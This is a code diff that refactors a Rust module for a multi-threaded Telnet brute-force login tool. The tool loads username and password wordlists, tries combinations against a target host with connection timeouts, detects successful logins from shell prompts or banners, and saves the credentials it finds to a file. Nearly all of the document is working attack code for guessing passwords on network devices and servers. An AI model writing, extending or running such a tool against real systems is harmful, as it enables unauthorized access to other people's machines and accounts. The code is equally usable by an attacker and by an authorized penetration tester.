@@ -1,11 +1,13 @@
 use anyhow::{Result, Context};
+use regex::Regex;
 use std::fs::{File, OpenOptions};
 use std::io::{self, BufRead, BufReader, Write};
-use std::net::ToSocketAddrs;
+use std::net::{TcpStream, ToSocketAddrs};
 use std::sync::{Arc, Mutex};
+use std::time::Duration;
 use telnet::Event;
 use threadpool::ThreadPool;
-use crossbeam_channel::{unbounded};
+use crossbeam_channel::unbounded;
 use telnet::Telnet;
 
 pub async fn run(target: &str) -> Result<()> {
@@ -16,9 +18,15 @@ pub async fn run(target: &str) -> Result<()> {
     let username_wordlist = prompt("Username wordlist file: ");
     let password_wordlist = prompt("Password wordlist file: ");
     let threads = prompt("Number of threads (default 8): ").parse().unwrap_or(8);
-    let stop_on_success = prompt("Stop on first valid login? (y/n): ").trim().eq_ignore_ascii_case("y");
-    let full_combo = prompt("Try every username with every password? (y/n): ").trim().eq_ignore_ascii_case("y");
-    let verbose = prompt("Verbose mode? (y/n): ").trim().eq_ignore_ascii_case("y");
+    let stop_on_success = prompt("Stop on first valid login? (y/n): ")
+        .trim()
+        .eq_ignore_ascii_case("y");
+    let full_combo = prompt("Try every username with every password? (y/n): ")
+        .trim()
+        .eq_ignore_ascii_case("y");
+    let verbose = prompt("Verbose mode? (y/n): ")
+        .trim()
+        .eq_ignore_ascii_case("y");
 
     let config = TelnetBruteforceConfig {
         target,
@@ -47,10 +55,11 @@ struct TelnetBruteforceConfig {
 }
 
 fn run_telnet_bruteforce(config: TelnetBruteforceConfig) -> Result<()> {
-    let addr = format!("{}:{}", config.target, config.port);
+    // 1) Normalize & validate host:port
+    let addr = normalize_target(&config.target, config.port)
+        .context("Invalid target address")?;
     let socket_addr = addr
-        .to_socket_addrs()
-        .context("Invalid target address")?
+        .to_socket_addrs()?
         .next()
         .context("Unable to resolve target address")?;
 
@@ -64,61 +73,57 @@ fn run_telnet_bruteforce(config: TelnetBruteforceConfig) -> Result<()> {
     let pool = ThreadPool::new(config.threads);
     let (tx, rx) = unbounded();
 
+    // 2) Build the combo queue
     if config.full_combo {
-        for user in &usernames {
-            for pass in &passwords {
-                tx.send((user.clone(), pass.clone()))?;
+        for u in &usernames {
+            for p in &passwords {
+                tx.send((u.clone(), p.clone()))?;
             }
+        }
+    } else if usernames.len() == 1 {
+        for p in &passwords {
+            tx.send((usernames[0].clone(), p.clone()))?;
+        }
+    } else if passwords.len() == 1 {
+        for u in &usernames {
+            tx.send((u.clone(), passwords[0].clone()))?;
         }
     } else {
-        if usernames.len() == 1 {
-            for pass in &passwords {
-                tx.send((usernames[0].clone(), pass.clone()))?;
-            }
-        } else if passwords.len() == 1 {
-            for user in &usernames {
-                tx.send((user.clone(), passwords[0].clone()))?;
-            }
-        } else {
-            println!("[!] Warning: Multiple usernames and passwords loaded, but full_combo is OFF. Trying first username with all passwords.");
-            for pass in &passwords {
-                tx.send((usernames[0].clone(), pass.clone()))?;
-            }
+        println!("[!] Multiple creds & full_combo=OFF → using first username.");
+        for p in &passwords {
+            tx.send((usernames[0].clone(), p.clone()))?;
         }
     }
-
     drop(tx);
 
+    // 3) Spawn workers
     for _ in 0..config.threads {
         let rx = rx.clone();
         let addr = addr.clone();
         let stop_flag = Arc::clone(&stop_flag);
         let creds = Arc::clone(&creds);
-        let config = config.clone();
+        let cfg = config.clone();
 
         pool.execute(move || {
-            while let Ok((username, password)) = rx.recv() {
+            while let Ok((user, pass)) = rx.recv() {
                 if *stop_flag.lock().unwrap() {
                     break;
                 }
-
-                if config.verbose {
-                    println!("[*] Trying {}:{}", username, password);
+                if cfg.verbose {
+                    println!("[*] Trying {}:{}", user, pass);
                 }
-
-                match try_telnet_login(&addr, &username, &password) {
+                match try_telnet_login(&addr, &user, &pass) {
                     Ok(true) => {
-                        println!("[+] Valid credentials: {}:{}", username, password);
-                        creds.lock().unwrap().push((username, password));
-
-                        if config.stop_on_success {
+                        println!("[+] Valid: {}:{}", user, pass);
+                        creds.lock().unwrap().push((user, pass));
+                        if cfg.stop_on_success {
                             *stop_flag.lock().unwrap() = true;
                             break;
                         }
                     }
                     Ok(false) => {}
                     Err(e) => {
-                        if config.verbose {
+                        if cfg.verbose {
                             eprintln!("[!] Error: {}", e);
                         }
                     }
@@ -126,25 +131,26 @@ fn run_telnet_bruteforce(config: TelnetBruteforceConfig) -> Result<()> {
             }
         });
     }
-
     pool.join();
 
-    let creds = creds.lock().unwrap();
-    if creds.is_empty() {
+    // 4) Report & optional save
+    let found = creds.lock().unwrap();
+    if found.is_empty() {
         println!("[-] No valid credentials found.");
     } else {
         println!("\n[+] Found credentials:");
-        for (u, p) in creds.iter() {
+        for (u, p) in found.iter() {
             println!(" - {}:{}", u, p);
         }
-
-        let save = prompt("\n[?] Save credentials to file? (y/n): ");
-        if save.trim().eq_ignore_ascii_case("y") {
-            let filename = prompt("Enter filename to save: ");
-            if let Err(e) = save_results(&filename, &creds) {
-                eprintln!("[!] Failed to save results: {}", e);
+        if prompt("\n[?] Save to file? (y/n): ")
+            .trim()
+            .eq_ignore_ascii_case("y")
+        {
+            let file = prompt("Filename: ");
+            if let Err(e) = save_results(&file, &found) {
+                eprintln!("[!] Failed to save: {}", e);
             } else {
-                println!("[+] Results saved to '{}'", filename);
+                println!("[+] Results saved to '{}'", file);
             }
         }
     }
@@ -152,43 +158,55 @@ fn run_telnet_bruteforce(config: TelnetBruteforceConfig) -> Result<()> {
     Ok(())
 }
 
+/// Attempt a single login, with 0.7 s connect+I/O timeout
 fn try_telnet_login(addr: &str, username: &str, password: &str) -> Result<bool> {
-    let mut connection = Telnet::connect((addr, 23), 256)
-        .context("Failed to connect to Telnet server")?;
+    // Resolve to SocketAddr
+    let socket = addr
+        .to_socket_addrs()?
+        .next()
+        .ok_or_else(|| anyhow::anyhow!("Could not resolve address"))?;
 
-    let mut login_prompt_seen = false;
-    let mut pass_prompt_seen = false;
+    // Connect with 1500 ms timeout
+    let stream = TcpStream::connect_timeout(&socket, Duration::from_millis(1500))
+        .context("Connection timed out")?;
+    // I/O timeout
+    stream
+        .set_read_timeout(Some(Duration::from_millis(1500)))
+        .context("Failed to set read timeout")?;
+    stream
+        .set_write_timeout(Some(Duration::from_millis(1500)))
+        .context("Failed to set write timeout")?;
 
+    // Wrap into Telnet
+    let mut connection = Telnet::from_stream(Box::new(stream), 256);
+
+    let mut login_seen = false;
+    let mut pass_seen = false;
     for _ in 0..10 {
-        let event = connection.read().context("Failed to read from Telnet")?;
-
-        match event {
-            Event::Data(buffer) => {
-                let output = String::from_utf8_lossy(&buffer).to_lowercase();
-
-                if !login_prompt_seen && (output.contains("login:") || output.contains("username")) {
-                    connection.write(format!("{}\n", username).as_bytes())?;
-                    login_prompt_seen = true;
-                } else if login_prompt_seen && !pass_prompt_seen && output.contains("password") {
-                    connection.write(format!("{}\n", password).as_bytes())?;
-                    pass_prompt_seen = true;
-                } else if pass_prompt_seen {
-                    // Look for signs of successful or failed login
-                    if output.contains("incorrect")
-                        || output.contains("failed")
-                        || output.contains("denied")
-                    {
-                        return Ok(false);
-                    } else if output.contains("last login")
-                        || output.contains("$")
-                        || output.contains("welcome")
-                        || output.contains("#")
-                    {
-                        return Ok(true);
-                    }
+        let event = connection.read().context("Read error or timeout")?;
+        if let Event::Data(buffer) = event {
+            let out = String::from_utf8_lossy(&buffer).to_lowercase();
+            if !login_seen && (out.contains("login:") || out.contains("username")) {
+                connection.write(format!("{}\n", username).as_bytes())?;
+                login_seen = true;
+            } else if login_seen && !pass_seen && out.contains("password") {
+                connection.write(format!("{}\n", password).as_bytes())?;
+                pass_seen = true;
+            } else if pass_seen {
+                if out.contains("incorrect")
+                    || out.contains("failed")
+                    || out.contains("denied")
+                {
+                    return Ok(false);
+                }
+                if out.contains("last login")
+                    || out.contains("$")
+                    || out.contains("#")
+                    || out.contains("welcome")
+                {
+                    return Ok(true);
                 }
             }
-            _ => {}
         }
     }
 
@@ -196,22 +214,50 @@ fn try_telnet_login(addr: &str, username: &str, password: &str) -> Result<bool> 
 }
 
 fn read_lines(path: &str) -> Result<Vec<String>> {
-    let file = File::open(path).context(format!("Unable to open {}", path))?;
-    Ok(BufReader::new(file).lines().filter_map(Result::ok).collect())
+    let f = File::open(path).context(format!("Unable to open {}", path))?;
+    Ok(BufReader::new(f).lines().filter_map(Result::ok).collect())
 }
 
 fn save_results(path: &str, creds: &[(String, String)]) -> Result<()> {
-    let mut file = OpenOptions::new().create(true).write(true).truncate(true).open(path)?;
+    let mut f = OpenOptions::new()
+        .create(true)
+        .write(true)
+        .truncate(true)
+        .open(path)?;
     for (u, p) in creds {
-        writeln!(file, "{}:{}", u, p)?;
+        writeln!(f, "{}:{}", u, p)?;
     }
     Ok(())
 }
 
-fn prompt(message: &str) -> String {
-    print!("{}", message);
+fn prompt(msg: &str) -> String {
+    print!("{}", msg);
     io::stdout().flush().unwrap();
-    let mut input = String::new();
-    io::stdin().read_line(&mut input).unwrap();
-    input.trim().to_string()
+    let mut buf = String::new();
+    io::stdin().read_line(&mut buf).unwrap();
+    buf.trim().to_string()
+}
+
+/// Enhanced IPv4/IPv6/domain normalizer & resolver
+fn normalize_target(host: &str, default_port: u16) -> Result<String> {
+    let re = Regex::new(r"^\[*(?P<addr>[^\]]+?)\]*(?::(?P<port>\d{1,5}))?$").unwrap();
+    let caps = re
+        .captures(host.trim())
+        .ok_or_else(|| anyhow::anyhow!("Invalid target format: {}", host))?;
+    let addr = caps.name("addr").unwrap().as_str();
+    let port = if let Some(m) = caps.name("port") {
+        m.as_str().parse::<u16>().context("Invalid port value")?
+    } else {
+        default_port
+    };
+    let formatted = if addr.contains(':') && !addr.contains('.') {
+        format!("[{}]:{}", addr, port)
+    } else {
+        format!("{}:{}", addr, port)
+    };
+    // Verify DNS/getaddrinfo
+    formatted
+        .to_socket_addrs()
+        .context(format!("Could not resolve {}", formatted))?;
+    Ok(formatted)
 }
